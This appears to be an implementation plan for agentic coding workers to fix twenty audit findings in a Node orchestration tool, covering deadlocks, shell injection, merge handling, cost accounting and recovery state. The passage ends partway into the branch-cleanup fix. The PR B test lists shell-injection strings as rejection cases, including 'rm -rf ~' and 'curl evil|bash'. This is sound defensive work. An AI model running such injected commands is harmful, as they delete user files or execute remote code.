# Audit Remediation Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Remediate all 20 latent issues found in the 2026-06-19 codebase audit (no open GitHub issues remain), each as an independently shippable, TDD'd PR.

**Architecture:** Eight thematic PRs, ordered by severity and blast radius. Each PR is self-contained: a failing test first, the minimal fix, then `npm test` + `npm run validate` green. The same branch → PR → squash-merge flow used for #36. Most PRs touch disjoint files and could be parallelized, but the recommended order is A→H so reviews stay simple.

**Tech Stack:** Node ≥22 ESM, `node --test`, `node:sqlite` (DatabaseSync), Ajv, git worktrees, `bash scripts/validate.sh`.

## Global Constraints

- Node `>=22` (`package.json` engines); ESM only (`"type":"module"`).
- Tests run with `node --test`; every fix is test-first (RED → GREEN). New tests must use real code, not mocks, except the one injectable subprocess seam already established in `worktree-deps.mjs`.
- Gate commands and worker commands run via shell **by design** for operator-trusted input only; never widen that trust.
- Immutability / fail-loud / surface-don't-swallow per repo rules.
- Each PR bumps the patch version across all 6 manifests (`package.json`, `package-lock.json` root + `packages[""]`, `.claude-plugin/plugin.json`, `.claude-plugin/marketplace.json` ×2, `.grok-plugin/plugin.json`) and adds a `CHANGELOG.md` entry. `validate.sh` check [3] enforces version agreement. Current version: **3.5.1** → bump per PR (3.5.2, 3.5.3, …) or batch into one release bump if shipped together.
- `main` is protected: PR + `validate` CI required. Use `gh`. Squash-merge.

## Finding → PR coverage map

| # | Finding | Severity | File(s) | PR |
|---|---------|----------|---------|----|
| O1 | Re-entrant limiter deadlock | CRITICAL | engine.mjs | A |
| SE1 | `contract.commands` shell injection | CRITICAL | implement.mjs, plan-schema.mjs | B |
| O2 | Unguarded merge commit blocks run on no-op squash | HIGH | merge.mjs | C |
| S3 | Per-task success commit failure swallowed → false `ok` | HIGH | implement.mjs | C |
| S2 | Anthropic schema parse bypasses retry loop | HIGH | llm/anthropic.mjs | D |
| S1 | `--plan-file` parse: raw throw + wrong exit code | HIGH | cli.mjs | D |
| S4 | `detectGates` `package.json` parse raw throw | MEDIUM | cli.mjs | D |
| ST3 | `maxCostUsd` cap races across parallel workers | HIGH | implement.mjs, store.mjs | E |
| ST5 | Worker cost/token accounting lossy | MEDIUM | implement.mjs, store.mjs | E |
| ST1 | No orchestrator lock; resume reaps live run | MEDIUM | cli.mjs, store.mjs | F |
| ST2 | `isAlive` fooled by PID reuse | MEDIUM | cli.mjs | F |
| ST4 | `setRunStatus` allows backward terminal transitions | MEDIUM | store.mjs | F |
| ST6 | `migrate()` base-table creation not transactional | LOW | store.mjs | F |
| SE2 | `cleanup` force-deletes ALL `ultraswarm/*` branches | MEDIUM | report.mjs | G |
| O3 | QA-rejected competition winner retries blind | MEDIUM | core.mjs | H |
| S5 | `parallel()` swallows rejections with no log | MEDIUM | engine.mjs | H |
| SE3 | Container isolation weaker than implied | MEDIUM | workers/adapters.mjs | H |
| SE4 | Env allowlist leaks all `XDG_*` | LOW | implement.mjs | H |
| S6 | Judge fallback to `impls[0]` undocumented | LOW | core.mjs | H |
| O4 | Competition win reports `final_model_tier:'external'` | LOW | core.mjs, implement.mjs | H |

---

## PR A — CRITICAL: fix the re-entrant limiter deadlock

**Branch:** `fix/engine-reentrant-limiter-deadlock`

**Root cause:** `lib/engine.mjs:15` has one module-level `globalLimit` that gates BOTH `pipeline()` (one slot held per wave task across its whole stage chain) AND `parallel()` (used *inside* high-risk/complex tasks for competition/judging/adversarial QA). An outer pipeline task holds its slot while awaiting an inner `parallel()` that needs a slot from the same pool. When concurrently-running nesting tasks fill the pool, all hang. On `cpus-2 ≤ 1` hosts (≤3 cores, common in CI), the pool size is 1, so the first high-risk task deadlocks immediately. The actual worker-subprocess cap is `workerLimit` (`runner.mjs:112`) at the leaf, so the orchestration-layer pool can safely use a *separate* limiter for nested `parallel()`.

**Files:**
- Modify: `lib/engine.mjs:15-29`
- Test: `lib/engine.test.mjs` (create if absent)

**Interfaces:**
- Produces: `parallel(thunks)` and `pipeline(items, ...stages)` unchanged signatures; new behavior = `parallel` uses a limiter distinct from `pipeline`'s. New env override `ULTRASWARM_MAX_CONCURRENCY` (integer) caps both limiters; falls back to `Math.max(1, Math.min(16, os.cpus().length - 2))`.

- [ ] **Step 1: Write the failing regression test**

Create/append `lib/engine.test.mjs`:

```js
import { test } from 'node:test'
import assert from 'node:assert/strict'

const withTimeout = (p, ms) => Promise.race([p, new Promise((_, r) => setTimeout(() => r(new Error('DEADLOCK: timed out')), ms))])

// #O1: a wave task (pipeline) that nests parallel() must not deadlock even when the concurrency
// pool is fully saturated. With one shared re-entrant limiter and cap=1 this hangs forever.
test('nested parallel inside pipeline does not deadlock when concurrency is saturated', async () => {
  process.env.ULTRASWARM_MAX_CONCURRENCY = '1'
  const { pipeline, parallel } = await import('./engine.mjs?reentrancy')  // query busts the module cache
  delete process.env.ULTRASWARM_MAX_CONCURRENCY
  const result = await withTimeout(pipeline([1, 2, 3], async (n) => {
    const inner = await parallel([() => Promise.resolve(n), () => Promise.resolve(n * 10)])
    return inner[0] + inner[1]
  }), 3000)
  assert.deepEqual(result, [11, 22, 33])
})
```

- [ ] **Step 2: Run it to confirm RED**

Run: `node --test --test-name-pattern="does not deadlock" lib/engine.test.mjs`
Expected: FAIL with `DEADLOCK: timed out` (the nested `parallel` can never acquire the single shared slot).

- [ ] **Step 3: Apply the minimal fix**

Replace `lib/engine.mjs:15-29` with:

```js
const MAX = Number.parseInt(process.env.ULTRASWARM_MAX_CONCURRENCY, 10) || Math.max(1, Math.min(16, os.cpus().length - 2))
// Two SEPARATE pools so nested orchestration parallel() never competes for the slots held by the
// outer pipeline() task that is awaiting it — a single shared limiter re-entrant-deadlocks (#O1).
// Real worker-subprocess concurrency is still capped at the leaf by runner.mjs workerLimit.
const pipelineLimit = makeLimiter(MAX)
const nestedLimit = makeLimiter(MAX)

export async function parallel(thunks) {
  return Promise.all(thunks.map((t) => nestedLimit(t).catch(() => null)))
}

export async function pipeline(items, ...stages) {
  return Promise.all(items.map((item, idx) => pipelineLimit(async () => {
    let v = item
    for (let i = 0; i < stages.length; i++) {
      try { v = await stages[i](v, item, idx) } catch { return null }
    }
    return v
  })))
}
```

(Leave a one-line code comment noting the residual rule: do not nest `parallel()` *inside another* `parallel()` thunk; the current call graph never does — competition/judge/QA `parallel`s run sequentially.)

- [ ] **Step 4: Run to confirm GREEN + full suite**

Run: `node --test lib/engine.test.mjs && node --test`
Expected: PASS; 354+ tests pass.

- [ ] **Step 5: Commit**

```bash
git add lib/engine.mjs lib/engine.test.mjs
git commit -m "fix(engine): separate nested parallel() limiter to break re-entrant deadlock"
```

---

## PR B — CRITICAL: sanitize plan `contract.commands` (shell injection)

**Branch:** `fix/contract-command-injection`

**Root cause:** `lib/plan-schema.mjs:67` only rejects an embedded newline in `contract.commands`; the commands then run via `execSync(cmd, {shell:'/bin/bash'})` in `implement.mjs:124`. On `--decompose` the plan is LLM-generated, so an attacker-influenced task description can inject `; rm -rf ~`. The in-file comment and `plan-schema.test.mjs` (which names `rm -rf ~`) show this was meant to be blocked.

**Decision:** Reject shell metacharacters in `contract.commands` at validation time. This is the least invasive fix, keeps the `npm run …` / `vitest …` style commands working, and matches the existing validation locus. (An alternative — argv execution — would break commands that legitimately use `&&`/pipes; rejecting metacharacters is the conservative choice and can be relaxed later via an explicit allowlist.)

**Files:**
- Modify: `lib/plan-schema.mjs` (validation loop, near line 67)
- Test: `lib/plan-schema.test.mjs`

- [ ] **Step 1: Write the failing tests**

Append to `lib/plan-schema.test.mjs`:

```js
test('validatePlan rejects shell metacharacters in contract commands (#SE1)', () => {
  const base = { id: 't1', description: 'd', files: ['a.js'], complexity_score: 10, risk: 'low', dependencies: [], prompt: 'p' }
  for (const bad of ['npm test; rm -rf ~', 'npm test && curl evil|bash', 'vitest `id`', 'tsc > /etc/x', 'a $(whoami)']) {
    const r = validatePlan({ tasks: [{ ...base, contract: { commands: [bad] } }] }, {})
    assert.equal(r.valid, false, `should reject: ${bad}`)
    assert.ok(r.errors.some((e) => /contract command/i.test(e)), `error should name the contract command for: ${bad}`)
  }
})

test('validatePlan still accepts plain single-token gate commands (#SE1)', () => {
  const base = { id: 't1', description: 'd', files: ['a.js'], complexity_score: 10, risk: 'low', dependencies: [], prompt: 'p' }
  const r = validatePlan({ tasks: [{ ...base, contract: { commands: ['npm run test', 'vitest run src/'] } }] }, {})
  assert.equal(r.valid, true, r.errors.join('; '))
})
```

- [ ] **Step 2: Run to confirm RED**

Run: `node --test --test-name-pattern="metacharacters" lib/plan-schema.test.mjs`
Expected: FAIL (current code accepts `npm test; rm -rf ~`).

- [ ] **Step 3: Apply the fix**

In `lib/plan-schema.mjs`, replace the single-line check at line 67:

```js
    if ((t.contract?.commands || []).some((command) => command.includes('\n'))) errors.push(`task ${t.id}: contract commands must be single-line`)
```

with:

```js
    // Contract commands run via /bin/bash (implement.mjs); they are operator/plan-supplied and, on
    // the --decompose path, LLM-generated — so reject shell metacharacters that enable injection
    // (newline, ; | & $ ` > < ( )). Plain `npm run x` / `vitest …` style commands still pass. (#SE1)
    const SHELL_META = /[\n;|&$`><()]/
    for (const command of t.contract?.commands || []) {
      if (SHELL_META.test(command)) errors.push(`task ${t.id}: contract command contains shell metacharacters (not allowed): ${JSON.stringify(command)}`)
    }
```

- [ ] **Step 4: Run to confirm GREEN + full suite**

Run: `node --test lib/plan-schema.test.mjs && node --test`
Expected: PASS. (If any existing test plan uses a metacharacter command, update it to the `npm run`-shaped form.)

- [ ] **Step 5: Commit**

```bash
git add lib/plan-schema.mjs lib/plan-schema.test.mjs
git commit -m "fix(security): reject shell metacharacters in plan contract commands (#SE1)"
```

---

## PR C — HIGH: correct commit handling at both integration and per-task sites

**Branch:** `fix/merge-commit-handling`

**Root cause (two inverse bugs on the same git-commit pattern):**
- `lib/orchestrator/merge.mjs:30` runs `git commit` **unguarded**. If a squash produces no net diff (a sibling task already landed the identical change), `git merge --squash` exits 0 but `git commit` throws → `runner` marks the whole wave + all later waves `blocked`.
- `lib/orchestrator/implement.mjs:151` wraps the per-task success commit in `try {…} catch {}` and then reports `status: 'ok'` regardless. A genuinely failed commit (hooks/identity) is masked, leaving an empty branch that merges nothing while the task is reported integrated.

**Files:**
- Modify: `lib/orchestrator/merge.mjs:26-31`
- Modify: `lib/orchestrator/implement.mjs:143-145`
- Test: `lib/orchestrator/merge.test.mjs`, `lib/orchestrator/implement.test.mjs`

- [ ] **Step 1: Failing test — no-op squash must not blow up the wave**

Append to `lib/orchestrator/merge.test.mjs`:

```js
test('mergeWave records no-op (no net change) instead of throwing and blocking the wave (#O2)', async () => {
  // Branch whose change is already present on the target → squash stages nothing → commit would fail.
  const repo = repoWithBranch('dup.txt', 'same')
  // Land the identical content on the target first.
  execSync('echo "same" > dup.txt && git add -A && git commit -q -m pre', { cwd: repo, shell: '/bin/bash' })
  const cfg = { repo, gates: [] }
  const r = await mergeWave(cfg, null, [{ task: 't1', cli: 'codex', impl: { branch: 'ultraswarm/t1-codex' } }])
  assert.equal(r.length, 1)
  assert.equal(r[0].merged, false)
  assert.match(r[0].reason, /no net change/i)
})
```

- [ ] **Step 2: Run to confirm RED**

Run: `node --test --test-name-pattern="no-op" lib/orchestrator/merge.test.mjs`
Expected: FAIL — the test throws out of `mergeWave` (unguarded `git commit` exits non-zero).

- [ ] **Step 3: Fix merge.mjs — short-circuit when nothing is staged**

Replace `lib/orchestrator/merge.mjs:26-31` (the comment + commit + push):

```js
    // `git merge --squash` already stages exactly the merged diff in the index. If it staged nothing
    // (the branch had no net change vs the target), committing would fail — record a clean no-op
    // instead of throwing and blocking the whole wave (#O2). Do NOT `git add -A` (issue #12).
    const staged = (() => { try { execFileSync('git', ['diff', '--cached', '--quiet'], { cwd: target }); return false } catch { return true } })()
    if (!staged) {
      execFileSync('git', ['reset', '--hard', 'HEAD'], { cwd: target })
      results.push({ task: r.task, cli: r.cli, merged: false, reason: 'no net change' })
      continue
    }
    execFileSync('git', ['commit', '-q', '-m', `feat: ${r.task} (ultraswarm: ${r.cli})`], { cwd: target })
    results.push({ task: r.task, cli: r.cli, merged: true })
```

(`git diff --cached --quiet` exits 0 when nothing is staged, 1 when there is a staged diff — so the `catch` branch means "there IS a staged diff".)

- [ ] **Step 4: Failing test — per-task commit failure must surface, not report `ok`**

Append to `lib/orchestrator/implement.test.mjs` (uses a pre-commit hook that fails the commit):

```js
test('runImplementation surfaces a failed success-commit instead of reporting ok (#S3)', async () => {
  const repo = makeRepo(), worktreeRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'us-wt-'))
  // Install a pre-commit hook in the repo that always fails; worktrees share the repo's hooks dir.
  const hookDir = path.join(repo, '.git', 'hooks')
  fs.writeFileSync(path.join(hookDir, 'pre-commit'), '#!/bin/sh\nexit 1\n'); fs.chmodSync(path.join(hookDir, 'pre-commit'), 0o755)
  const cfg = { repo, repoName: 'r', baseBranch: 'HEAD', worktreeRoot,
    gates: [{ name: 'present', cmd: 'test -f generated.js' }], registry: { codex: `node ${fakeCli}` } }
  const t = { id: 'tc1', description: 'd', files: ['generated.js'], model_tier: 'simple', complexity_score: 10, prompt: 'go' }
  const r = await runImplementation(cfg, t, 'codex', 1, [])
  assert.notEqual(r.status, 'ok')
  assert.match(r.summary, /commit/i)
})
```

- [ ] **Step 5: Run to confirm RED**

Run: `node --test --test-name-pattern="failed success-commit" lib/orchestrator/implement.test.mjs`
Expected: FAIL — current code swallows the commit error and returns `ok`.

- [ ] **Step 6: Fix implement.mjs — fail loud on commit failure**

Replace `lib/orchestrator/implement.mjs:143-145`:

```js
    execFileSync('git', ['add', '-A'], { cwd: wt })
    try { execFileSync('git', ['commit', '-q', '-m', `ultraswarm: ${t.id}/${t.model_tier} attempt ${attempt}`], { cwd: wt }) }
    catch (e) {
      if (attemptId) cfg.store.finishAttempt(attemptId, { status: 'failed', errorKind: 'commit_failed' })
      return impl('cli_failed', wt, br, changed, gate_results, `success commit failed for ${t.id} (#S3): ${String(e.stderr || e.message).slice(0, 300)}`, parseTokens(out))
    }
    const status = gate_results.every((g) => g.pass) ? 'ok' : 'gates_failed'
```

- [ ] **Step 7: Run GREEN + full suite**

Run: `node --test && npm run validate`
Expected: PASS / all checks pass.

- [ ] **Step 8: Commit**

```bash
git add lib/orchestrator/merge.mjs lib/orchestrator/implement.mjs lib/orchestrator/merge.test.mjs lib/orchestrator/implement.test.mjs
git commit -m "fix(merge): no-op squash records clean skip; per-task commit failure fails loud (#O2,#S3)"
```

---

## PR D — HIGH: input-boundary validation (brain schema + CLI JSON parses)

**Branch:** `fix/input-boundary-validation`

**Root causes:**
- `lib/llm/anthropic.mjs:22`: `JSON.parse(text)` on schema calls throws on truncated/fenced output; the throw is *outside* `completeWithSchema`'s try (`validate.mjs:14`), so it escapes the retry loop. `claude-cli.mjs:51` returns raw text on extraction failure so the validator retries — Anthropic must match.
- `bin/cli.mjs:74`: `--plan-file` `JSON.parse` with no try/catch and no `{code:'USAGE'}` → raw `SyntaxError`, reported as `RUNTIME(1)` not `USAGE(2)`.
- `bin/cli.mjs:32`: `detectGates` parses the repo `package.json` with a bare `JSON.parse` → cryptic throw with no file context.

**Files:**
- Modify: `lib/llm/anthropic.mjs` (`complete()` + a small `extractJson` helper)
- Modify: `bin/cli.mjs` (`loadPlan`, `detectGates`)
- Test: `lib/llm/anthropic.test.mjs`, `bin/cli.test.mjs`

- [ ] **Step 1: Failing test — Anthropic returns raw text (not throw) on bad JSON**

Append to `lib/llm/anthropic.test.mjs` (inject a fake SDK client so no network):

```js
test('complete() returns raw text on non-JSON schema output so the validator can retry (#S2)', async () => {
  const client = new AnthropicClient({ apiKey: 'x' })
  client.client = { messages: { create: async () => ({ content: [{ type: 'text', text: 'Here you go: ```not json```' }], usage: {} }) } }
  const r = await client.complete({ schema: { type: 'object' }, prompt: 'p', model: 'claude-opus-4-8' })
  assert.equal(typeof r.object, 'string')          // raw text, not a thrown SyntaxError
  assert.match(r.object, /not json/)
})
```

- [ ] **Step 2: Run to confirm RED**

Run: `node --test --test-name-pattern="raw text on non-JSON" lib/llm/anthropic.test.mjs`
Expected: FAIL — `JSON.parse` throws out of `complete()`.

- [ ] **Step 3: Fix anthropic.mjs — defensive extraction**

Add a helper and use it in `complete()`:

```js
// Extract a JSON object/array from model text (handles ```json fences and prose wrappers).
// Returns the parsed value, or null if nothing parses — caller returns raw text so the schema
// validator rejects-and-retries instead of this throwing out of the retry loop (#S2).
function extractJson(text) {
  const fenced = text.match(/```(?:json)?\s*([\s\S]*?)```/i)
  const candidate = (fenced ? fenced[1] : text).trim()
  try { return JSON.parse(candidate) } catch {}
  const span = candidate.match(/[{[][\s\S]*[}\]]/)
  if (span) { try { return JSON.parse(span[0]) } catch {} }
  return null
}
```

and change the return in `complete()`:

```js
    return { object: opts.schema ? (extractJson(text) ?? text) : text, usage: res.usage }
```

- [ ] **Step 4: Failing test — `--plan-file` errors are USAGE with context**

Append to `bin/cli.test.mjs`:

```js
test('run with a malformed --plan-file fails as USAGE with file context (#S1)', async () => {
  const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'us-cli-'))
  execSync('git init -q && git config user.email t@t && git config user.name t && git commit -q --allow-empty -m seed', { cwd: repo, shell: '/bin/bash' })
  const bad = path.join(repo, 'bad-plan.json'); fs.writeFileSync(bad, '{ not json')
  await assert.rejects(() => commandMain(['run', '--plan-file', bad, '--approve-plan'], repo),
    (e) => e.code === 'USAGE' && /plan file/i.test(e.message))
})
```

- [ ] **Step 5: Run RED**

Run: `node --test --test-name-pattern="malformed --plan-file" bin/cli.test.mjs`
Expected: FAIL — raw `SyntaxError`, no `code:'USAGE'`.

- [ ] **Step 6: Fix cli.mjs `loadPlan` (line 74) and `detectGates` (line 32)**

`loadPlan`:

```js
  if (planFile) {
    const resolved = path.resolve(planFile)
    try { return JSON.parse(fs.readFileSync(resolved, 'utf8')) }
    catch (e) { throw Object.assign(new Error(`invalid plan file ${resolved}: ${e.message}`), { code: 'USAGE' }) }
  }
```

`detectGates` (wrap the parse only):

```js
  let scripts = {}
  if (fs.existsSync(file)) {
    try { scripts = JSON.parse(fs.readFileSync(file, 'utf8')).scripts || {} }
    catch (e) { throw Object.assign(new Error(`invalid package.json in ${repo}: ${e.message}`), { code: 'USAGE' }) }
  }
```

(Delete the old `const scripts = …` line; the rest of `detectGates` is unchanged.)

- [ ] **Step 7: Run GREEN + full suite + validate**

Run: `node --test && npm run validate`
Expected: PASS / all checks pass.

- [ ] **Step 8: Commit**

```bash
git add lib/llm/anthropic.mjs lib/llm/anthropic.test.mjs bin/cli.mjs bin/cli.test.mjs
git commit -m "fix: validate JSON boundaries — anthropic schema retry, plan-file & package.json (#S2,#S1,#S4)"
```

---

## PR E — HIGH: cost-cap enforcement and accounting

**Branch:** `fix/cost-accounting`

**Root causes:**
- `implement.mjs:64` checks `totalCost() >= maxCostUsd` (read-then-act); `startAttempt` (`store.mjs:165`) records no cost, so N parallel workers all pass before any records spend → overrun by up to N tasks.
- `finishAttempt` records `costUsd: supervised?.usage?.costUsd` which is undefined for token-only CLI workers (most), and never writes `inputTokens` → `totalCost()` (`store.mjs:207`) undercounts worker spend, so the cap mostly sees brain cost.

**Decision:** Derive `costUsd` from token usage × price (reuse `priceUsd` from `lib/llm/pricing.mjs`) when a worker reports tokens but no dollar figure, and record `inputTokens`. This both fixes accounting (ST5) and tightens the cap (ST3). True atomic reservation is deferred; instead we record cost at `finishAttempt` accurately AND make the pre-flight check conservative by counting in-flight running attempts at an estimated floor (documented limitation: cap is now correct to within one attempt's cost per worker, not N).

**Files:**
- Modify: `lib/orchestrator/implement.mjs` (cost derivation in `finishAttempt` call; `allowedEnv` untouched)
- Modify: `lib/state/store.mjs` (`totalCost` unchanged; add running-attempt awareness is out of scope — see note)
- Test: `lib/orchestrator/implement.test.mjs`, `lib/state/store.test.mjs`

- [ ] **Step 1: Failing test — worker token usage produces a non-zero cost**

Append to `lib/orchestrator/implement.test.mjs`:

```js
test('finishAttempt records a derived USD cost from worker token usage (#ST5)', async () => {
  const repo = makeRepo(), worktreeRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'us-wt-'))
  const finished = []
  const store = { totalCost: () => 0, recordMetric: () => {}, startAttempt: () => 1,
    finishAttempt: (id, r) => finished.push(r) }
  const workerManager = { get: () => ({
    execute: async ({ cwd, onStart }) => { onStart({ pid: 1, logPath: '/tmp/x' })
      fs.writeFileSync(path.join(cwd, 'generated.js'), '//x\n')
      return { code: 0, stdout: 'tokens used: 1000', stderr: '', durationMs: 5, usage: { input_tokens: 1000, output_tokens: 2000 } } },
    classifyFailure: () => 'error' }) }
  const cfg = { repo, repoName: 'r', baseBranch: 'HEAD', worktreeRoot, gates: [],
    intelligence: {}, registry: {}, workerManager, store, runId: 'r1',
    timeouts: {}, taskClasses: {} }
  const t = { id: 'tk', description: 'd', files: ['generated.js'], model_tier: 'simple', complexity_score: 10, prompt: 'go' }
  await runImplementation(cfg, t, 'codex', 1, [])
  assert.equal(finished.length, 1)
  assert.ok(finished[0].inputTokens === 1000)
  assert.ok(finished[0].costUsd > 0, 'cost derived from tokens when worker reports no USD')
})
```

- [ ] **Step 2: Run RED**

Run: `node --test --test-name-pattern="derived USD cost" lib/orchestrator/implement.test.mjs`
Expected: FAIL — `costUsd` is undefined and `inputTokens` is never set.

- [ ] **Step 3: Fix implement.mjs `finishAttempt` call (lines 147-148)**

Import the pricer at the top of `implement.mjs`:

```js
import { priceUsd } from '../llm/pricing.mjs'
```

Replace the success-path `finishAttempt` call:

```js
    if (attemptId) {
      const usage = supervised?.usage ?? {}
      const inputTokens = usage.input_tokens ?? usage.inputTokens ?? null
      const outputTokens = usage.totalTokens ?? usage.output_tokens ?? usage.outputTokens ?? parseTokens(out)
      // Most CLI workers report tokens, not USD — derive a cost so totalCost()/maxCostUsd see real
      // worker spend, not just brain cost (#ST5). Price at the task's model where known.
      const costUsd = usage.costUsd ?? priceUsd(t.model || t.model_tier, { input_tokens: inputTokens ?? 0, output_tokens: outputTokens ?? 0 }, cfg)
      cfg.store.finishAttempt(attemptId, { status: status === 'ok' ? 'passed' : 'failed', exitCode: supervised?.code ?? 0,
        durationMs: supervised?.durationMs, inputTokens, outputTokens, costUsd })
    }
```

- [ ] **Step 4: Document & narrow the cap-race (ST3)**

Add a comment above the `maxCostUsd` check at `implement.mjs:63-65` stating the known limitation and the mitigation now in place:

```js
    // Budget gate. NOTE: this is a read-then-act check; with N parallel workers the cap can be
    // overrun by up to one in-flight attempt per worker before costs land at finishAttempt. Costs
    // are now derived from tokens (#ST5) so the post-hoc total is accurate; tighten to an atomic
    // reservation at startAttempt if a hard cap is later required (#ST3).
```

- [ ] **Step 5: Run GREEN + full suite + validate**

Run: `node --test && npm run validate`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add lib/orchestrator/implement.mjs lib/orchestrator/implement.test.mjs
git commit -m "fix(cost): derive worker USD from tokens, record inputTokens; document cap race (#ST5,#ST3)"
```

---

## PR F — MEDIUM: recovery safety (lock, liveness, status transitions, atomic migrate)

**Branch:** `fix/recovery-safety`

**Root causes:**
- No lock prevents `resume`/`run` concurrency; in a between-waves window `resumeCommand` (`cli.mjs` ~258-271) can mark a live run `completed_with_findings` (ST1).
- `isAlive` via `process.kill(pid,0)` is fooled by PID reuse after reboot (ST2).
- `setRunStatus` (`store.mjs:134`) writes any status; terminal `merged`/`cancelled` can be moved backward (ST4).
- `migrate()` (`store.mjs:89-94`) creates base tables + inserts the version row outside a transaction (ST6).

**Files:**
- Modify: `lib/state/store.mjs` (`setRunStatus` guard; `migrate` atomicity; add a `boot_id`/heartbeat column)
- Modify: `bin/cli.mjs` (`run`/`resume` lock + heartbeat; robust liveness)
- Test: `lib/state/store.test.mjs`, `lib/orchestrator/integration.test.mjs` (or `bin/cli.test.mjs`)

- [ ] **Step 1: Failing test — terminal states are immutable**

Append to `lib/state/store.test.mjs`:

```js
test('setRunStatus refuses to move a terminal run backward (#ST4)', () => {
  const store = new StateStore(path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'us-st-')), 'state.sqlite'))
  store.createRun({ id: 'r', repo: '/x', baseSha: 'b', plan: { tasks: [] }, policy: resolvePolicy(), waves: [] })
  store.setRunStatus('r', 'merged')
  assert.throws(() => store.setRunStatus('r', 'running'), /terminal|immutable/i)
  assert.equal(store.getRun('r').status, 'merged')
})
```

- [ ] **Step 2: Run RED** — `node --test --test-name-pattern="terminal run backward" lib/state/store.test.mjs` → FAIL.

- [ ] **Step 3: Fix `setRunStatus` (store.mjs:134)** — reject transitions out of terminal states:

```js
  setRunStatus(runId, status, extra = {}) {
    const now = new Date().toISOString()
    const run = this.getRun(runId)
    if (!run) throw new Error(`run not found: ${runId}`)
    const TERMINAL = new Set(['merged', 'cancelled'])
    if (TERMINAL.has(run.status) && run.status !== status) {
      throw new Error(`run ${runId} is in terminal state '${run.status}'; refusing transition to '${status}' (#ST4)`)
    }
    this.transaction(() => { /* …unchanged UPDATE + appendEvent… */ })
  }
```

- [ ] **Step 4: Failing test — `migrate` base tables are created atomically**

Append to `lib/state/store.test.mjs`:

```js
test('migrate wraps base-table creation + version insert in one transaction (#ST6)', () => {
  // A fresh DB opened twice must end with exactly one schema_meta row and all base tables present.
  const file = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'us-mig-')), 'state.sqlite')
  const a = new StateStore(file); const b = new StateStore(file)   // both run migrate()
  const rows = a.db.prepare('SELECT COUNT(*) AS n FROM schema_meta').get().n
  assert.equal(rows, 1)
  assert.doesNotThrow(() => a.db.prepare('SELECT 1 FROM attempts LIMIT 1').get())
  a.db.close?.(); b.db.close?.()
})
```

- [ ] **Step 5: Run RED** (may pass opportunistically; the value is the regression guard) — if it passes, keep it; the fix below makes the guarantee explicit.

- [ ] **Step 6: Fix `migrate` (store.mjs:89-94)** — wrap the bootstrap in a transaction:

```js
  migrate() {
    this.transaction(() => {
      this.db.exec('CREATE TABLE IF NOT EXISTS schema_meta (id INTEGER PRIMARY KEY CHECK(id=1), version INTEGER NOT NULL)')
      this.db.exec(BASE_TABLES)
      this.db.prepare('INSERT OR IGNORE INTO schema_meta(id,version) VALUES(1,?)').run(SCHEMA_VERSION)
    })
    const stored = this.db.prepare('SELECT version FROM schema_meta WHERE id=1').get()?.version ?? SCHEMA_VERSION
    // …unchanged migration loop…
  }
```

- [ ] **Step 7: Failing test — `resume` will not complete a live run; liveness uses orchestrator identity**

Add a SCHEMA migration introducing `runs.orchestrator_pid` + `runs.orchestrator_boot` (boot id read from `/proc/sys/kernel/random/boot_id`, falling back to `''`). Then in `bin/cli.test.mjs`:

```js
test('resume refuses to complete a run whose orchestrator is still alive (#ST1)', async () => {
  const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'us-cli-'))
  execSync('git init -q && git config user.email t@t && git config user.name t && git commit -q --allow-empty -m seed', { cwd: repo, shell: '/bin/bash' })
  const store = openRepoStore(repo)
  store.createRun({ id: 'r', repo, baseSha: execSync('git rev-parse HEAD', { cwd: repo, encoding: 'utf8' }).trim(), plan: { tasks: [] }, policy: resolvePolicy(), waves: [] })
  // Stamp this very process as the live orchestrator.
  store.db.prepare('UPDATE runs SET status=?, orchestrator_pid=?, orchestrator_boot=? WHERE id=?').run('running', process.pid, store.bootId(), 'r')
  store.close()
  await assert.rejects(() => commandMain(['resume', 'r'], repo), (e) => e.code === 'BLOCKED' && /still (alive|running)/i.test(e.message))
})
```

- [ ] **Step 8: Run RED** — FAIL (resume currently reaps by worker pid only).

- [ ] **Step 9: Implement orchestrator identity + liveness**

In `store.mjs`: add `bootId()` (reads boot_id once, caches; `''` if unreadable), `setOrchestrator(runId, pid, bootId)`, and migration adding the two columns. In `cli.mjs`:
- `runCommand`: right after `createRun`, call `store.setOrchestrator(runId, process.pid, store.bootId())`.
- `resumeCommand` (the `run.status === 'running'` branch): before reaping, treat the run as live if `run.orchestrator_boot === store.bootId() && isAlive(run.orchestrator_pid)` → throw `BLOCKED` "orchestrator still alive; cancel it first". Only when the orchestrator is confirmed dead (different boot id, or dead pid) proceed to reap orphaned attempts and complete. This judges liveness on the durable orchestrator identity, not transient worker pids, and the boot-id check defeats PID reuse across reboots (#ST1, #ST2).

```js
    if (run.status === 'running') {
      const orchestratorAlive = run.orchestrator_boot === store.bootId() && run.orchestrator_pid && isAlive(run.orchestrator_pid)
      if (orchestratorAlive) throw Object.assign(new Error(`run ${runId} orchestrator (pid ${run.orchestrator_pid}) is still alive; cancel it first`), { code: 'BLOCKED' })
      // orchestrator confirmed dead → reap orphaned attempts and complete (existing logic) …
    }
```

- [ ] **Step 10: Run GREEN + full suite + validate**

Run: `node --test && npm run validate`
Expected: PASS. Add the new columns to any `createRun`/schema tests that assert column sets.

- [ ] **Step 11: Commit**

```bash
git add lib/state/store.mjs bin/cli.mjs lib/state/store.test.mjs bin/cli.test.mjs
git commit -m "fix(recovery): orchestrator-identity liveness, terminal-state guard, atomic migrate (#ST1,#ST2,#ST4,#ST6)"
```

---

## PR G — MEDIUM: scope `cleanup` to the current run's branches

**Branch:** `fix/cleanup-branch-scope`

**Root cause:** `lib/orchestrator/report.mjs:42-46` force-deletes **every** `ultraswarm/*` branch in the repo, destroying a concurrent/paused run's unmerged branches. The per-task worktree removal just above is already scoped by `${cfg.repoName}-us-`; the branch deletion must be scoped to this run too.

**Files:**
- Modify: `lib/orchestrator/report.mjs:42-48`
- Test: `lib/orchestrator/report.test.mjs`

- [ ] **Step 1: Failing test**

Append to `lib/orchestrator/report.test.mjs`:

```js
test('cleanup deletes only this run\'s branches, not another run\'s (#SE2)', () => {
